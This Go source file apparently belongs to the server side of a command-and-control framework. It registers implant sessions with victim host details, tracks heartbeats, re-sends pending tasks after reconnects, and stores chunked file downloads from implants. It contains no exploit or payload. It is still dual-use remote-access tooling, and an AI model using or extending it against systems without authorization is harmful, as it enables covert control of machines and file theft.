package listener

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"time"

	"toshell/internal/common/protocol"
	"toshell/internal/common/types"
	"toshell/internal/server/logging"
	"toshell/internal/server/session"
	"toshell/internal/server/task"
)

// ─── 共享会话处理核心 ────────────────────────────────────────────────
// TCP / HTTP / WebSocket 三套监听器的注册/心跳/结果处理高度重复，
// 这里提取公共部分（SessionInfo 组装、会话 upsert、回调触发），
// 各监听器只保留传输差异（连接绑定、ACK 格式）。

// sessionManagerIf 共享核心所需的 session.Manager 子集。
type sessionManagerIf interface {
	Get(id string) (*session.Session, error)
	Add(info *types.SessionInfo) error
	Update(id string, info *types.SessionInfo) error
	RefreshInfo(id string, info *types.SessionInfo) error
	Remove(id string) error
}

// buildSessionInfo 从注册包组装 SessionInfo。
func buildSessionInfo(packet *protocol.Packet, reg protocol.Register, listenerName, listenerID, remoteAddr string) *types.SessionInfo {
	now := time.Now()
	return &types.SessionInfo{
		ID:           fmt.Sprintf("%x", packet.ID),
		Hostname:     reg.Hostname,
		Username:     reg.Username,
		OS:           reg.OS,
		Arch:         reg.Arch,
		PID:          reg.PID,
		ProcessName:  reg.ProcessName,
		ProcessPath:  reg.ProcessPath,
		IPAddresses:  reg.IPAddresses,
		MACAddresses: reg.MACAddresses,
		Domain:       reg.Domain,
		FirstSeen:    now,
		LastSeen:     now,
		Status:       "active",
		Listener:     listenerName,
		ListenerID:   listenerID,
		RemoteAddr:   remoteAddr,
	}
}

// upsertSession 注册会话：已存在则刷新信息（保留上层状态），否则新建并触发上线回调。
// 返回是否为新会话。
func upsertSession(mgr sessionManagerIf, info *types.SessionInfo, onOnline func(*types.SessionInfo)) bool {
	if mgr == nil {
		return false
	}
	if existing, gerr := mgr.Get(info.ID); gerr == nil && existing != nil {
		info.LastSeen = time.Now()
		_ = mgr.RefreshInfo(info.ID, info)
		return false
	}
	if err := mgr.Add(info); err != nil {
		// 极端兜底：清理后重建
		_ = mgr.Remove(info.ID)
		if err2 := mgr.Add(info); err2 != nil {
			return false
		}
	}
	if onOnline != nil {
		onOnline(info)
	}
	return true
}

// touchSession 心跳：刷新 LastSeen，状态恢复 active。
func touchSession(mgr sessionManagerIf, sessionID string) {
	if mgr == nil {
		return
	}
	sess, err := mgr.Get(sessionID)
	if err == nil && sess != nil {
		now := time.Now()
		sess.LastSeen = now
		sess.Info.LastSeen = now
		if sess.Info.Status != "active" {
			sess.Info.Status = "active"
		}
	}
}

// unmarshalRegister 解析注册包 payload。
func unmarshalRegister(payload []byte) (protocol.Register, error) {
	var reg protocol.Register
	if err := json.Unmarshal(payload, &reg); err != nil {
		return reg, err
	}
	return reg, nil
}

// ─── 会话热迁移：重连续传 ─────────────────────────────────────────────
// 断连重连后，会话对象（隧道/shell 处理器）已由 upsertSession 保留；
// 这里补发"在途任务"：pending（未派发）与 sent（派发后未收到结果）的任务
// 重新下发；大文件下载若服务端已有部分分块，则下发断点续传任务。

// taskReplayer 补发任务所需的推送能力（TCP / WebSocket 监听器实现）。
type taskReplayer interface {
	PushTask(sessionID string, taskInfo *types.TaskInfo) error
}

// uploadReplayer 补发大文件上传所需的推送能力（与 PushTask 同实现者）。
type uploadReplayer interface {
	PushFileUpload(sessionID, uploadID, filename, targetPath string, size int64, taskID uint64) error
}

// replaySessionTasks 会话重连时补发在途任务，返回补发数量。
// 断点状态存全局 task.Manager（listener 实例随 stop/start 重建，
// 断点必须跨实例存活，否则续传退化为全量重推）：
//   已有部分分块 → 下发 resume 任务（Data 携带 transfer_id + offset）；
//   无分块/其他任务 → 原样重推（pending 任务照常入队）。
// file_upload 任务：Data 携带上传元数据（upload_id/filename/size），
// 若暂存文件仍在则重推 PushFileUpload（断点续传）。
func replaySessionTasks(mgr taskManagerIf, replayer taskReplayer, uploader uploadReplayer, sessionID string) int {
	if mgr == nil || replayer == nil {
		return 0
	}
	tasks := mgr.ListReplayable(sessionID)
	if len(tasks) == 0 {
		return 0
	}
	replayed := 0
	for _, t := range tasks {
		// 大文件上传断点续传：暂存文件仍在则重推分片
		if t.TaskType == "file_upload" && uploader != nil {
			var meta struct {
				UploadID string `json:"upload_id"`
				Filename string `json:"filename"`
				Size     int64  `json:"size"`
			}
			if json.Unmarshal([]byte(t.Data), &meta) == nil && meta.UploadID != "" {
				staged := filepath.Join("data", "uploads", sessionID, meta.UploadID)
				if _, err := os.Stat(staged); err == nil {
					if err := uploader.PushFileUpload(sessionID, meta.UploadID, meta.Filename, t.Path, meta.Size, t.ID); err == nil {
						replayed++
						logging.Info("listener", "Hot-migrate: resumed file upload task %d (%s)", t.ID, meta.UploadID)
					}
					continue
				}
			}
			// 暂存文件已清理（推送成功或超时清理）：不重推，
			// 避免把上传元数据 JSON 当作文件内容下发
			continue
		}
		// 大文件下载断点续传：服务端已收到部分分块 → 下发 resume 任务
		if t.TaskType == "file_download" {
			if st, ok := mgr.GetTransfer(t.ID); ok && st.Received > 0 && st.Received < st.Size {
				resume, _ := json.Marshal(map[string]interface{}{
					"resume":      true,
					"transfer_id": st.TransferID,
					"offset":      st.Received,
				})
				cp := *t
				cp.Data = string(resume)
				if err := replayer.PushTask(sessionID, &cp); err == nil {
					replayed++
					logging.Info("listener", "Hot-migrate: resumed file download task %d at offset %d (transfer %s)", t.ID, st.Received, st.TransferID)
				}
				continue
			}
		}
		if err := replayer.PushTask(sessionID, t); err == nil {
			replayed++
		}
	}
	if replayed > 0 {
		logging.Info("listener", "Hot-migrate: replayed %d in-flight task(s) for session %s", replayed, sessionID)
	}
	return replayed
}

// processFileDownChunk 共享的大文件分块落盘逻辑（TCP/WS/HTTP 三监听器共用）。
// 返回写入的字节数（数据帧）或 0（done 帧）；失败返回描述性错误。
func processFileDownChunk(sessionID string, chunk fileDownChunk) (int, error) {
	if chunk.TransferID == "" || strings.ContainsAny(chunk.TransferID, "/\\:") {
		return 0, fmt.Errorf("invalid transfer_id %q", chunk.TransferID)
	}
	dir := filepath.Join("data", "transfers", sessionID)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return 0, fmt.Errorf("mkdir %s failed: %w", dir, err)
	}
	target := filepath.Join(dir, chunk.TransferID)

	if chunk.Done {
		info, err := os.Stat(target)
		if err != nil {
			return 0, fmt.Errorf("done %s but target missing: %w", target, err)
		}
		if info.Size() != chunk.Size {
			return 0, fmt.Errorf("done %s size mismatch: got %d want %d (chunk lost?)", target, info.Size(), chunk.Size)
		}
		meta := fmt.Sprintf(`{"transfer_id":%q,"filename":%q,"size":%d}`, chunk.TransferID, chunk.Filename, chunk.Size)
		if err := os.WriteFile(target+".meta", []byte(meta), 0o644); err != nil {
			return 0, fmt.Errorf("write meta %s failed: %w", target+".meta", err)
		}
		return 0, nil
	}

	// 安全加固：offset/size 合法性校验 —— 恶意植入端可上报超大 offset 制造
	// 稀疏大文件（offset 处 seek 写 1 字节即占满逻辑大小）撑爆服务端磁盘。
	if chunk.Offset < 0 || chunk.Size < 0 || chunk.Offset > chunk.Size {
		return 0, fmt.Errorf("invalid chunk offset=%d size=%d", chunk.Offset, chunk.Size)
	}
	if chunk.Size > maxTransferSize {
		return 0, fmt.Errorf("transfer size %d exceeds limit %d", chunk.Size, maxTransferSize)
	}

	data, err := base64.StdEncoding.DecodeString(chunk.Data)
	if err != nil || len(data) == 0 {
		return 0, fmt.Errorf("bad chunk data len=%d", len(chunk.Data))
	}
	// offset + data 不得越过声明大小（防越界写）
	if chunk.Offset+int64(len(data)) > chunk.Size {
		return 0, fmt.Errorf("chunk overflows size: offset=%d len=%d size=%d", chunk.Offset, len(data), chunk.Size)
	}
	f, err := os.OpenFile(target, os.O_CREATE|os.O_WRONLY, 0o644)
	if err != nil {
		return 0, fmt.Errorf("open %s failed: %w", target, err)
	}
	defer f.Close()
	if _, err := f.Seek(chunk.Offset, io.SeekStart); err != nil {
		return 0, fmt.Errorf("seek %s @%d failed: %w", target, chunk.Offset, err)
	}
	if _, err := f.Write(data); err != nil {
		return 0, fmt.Errorf("write %s @%d failed: %w", target, chunk.Offset, err)
	}
	return len(data), nil
}

// maxTransferSize 单次大文件直传的大小上限（默认 4GB，防恶意 size 上报撑爆磁盘）。
const maxTransferSize = int64(4 << 30)

// taskManagerIf 补发任务所需的 task.Manager 子集。
type taskManagerIf interface {
	ListReplayable(sessionID string) []*types.TaskInfo
	GetTransfer(taskID uint64) (*task.TransferState, bool)
}
